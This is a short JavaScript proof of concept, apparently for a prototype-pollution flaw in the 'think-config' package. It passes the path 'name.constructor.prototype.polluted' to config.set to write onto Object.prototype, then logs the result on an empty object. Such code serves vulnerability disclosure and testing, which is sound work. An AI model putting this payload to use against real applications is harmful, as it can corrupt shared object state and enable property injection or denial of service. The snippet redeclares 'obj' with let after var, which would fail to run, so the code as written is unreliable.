var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
const Config = require('think-config');
const config = new Config({ name: 2 });
console.log({}.polluted);
let obj = {};
config.set('name.constructor.prototype.polluted', 'yes');
console.log({}.polluted);